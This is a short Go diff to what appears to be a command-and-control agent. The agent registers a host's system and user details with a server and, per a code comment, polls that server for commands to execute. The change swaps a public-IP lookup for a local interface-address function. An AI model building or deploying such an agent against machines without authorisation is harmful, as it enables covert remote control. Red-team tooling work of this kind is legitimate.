@@ -18,6 +18,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"os/exec"
 	"os/user"
@@ -50,9 +51,7 @@ func register(serverIP string) string {
 	stats, _ := host.Info()
 	user, _ := user.Current()
 	// get ip
-	resp, _ := http.Get("http://api.ipify.org")
-	body, _ := ioutil.ReadAll(resp.Body)
-	ip := string(body)
+	ip := GetLocalIP()
 	// set info in the requests json
 	host_info := system_info{
 		stats,
@@ -68,6 +67,22 @@ func register(serverIP string) string {
 	body2, _ := ioutil.ReadAll(resp_register.Body)
 	agent_id := string(body2)
 	return agent_id
+}
+
+func GetLocalIP() string {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return ""
+	}
+	for _, address := range addrs {
+		// check the address type and if it is not a loopback the display it
+		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+			if ipnet.IP.To4() != nil {
+				return ipnet.IP.String()
+			}
+		}
+	}
+	return ""
 }
 
 // Polls the server for commands and executes them, sending back the result.
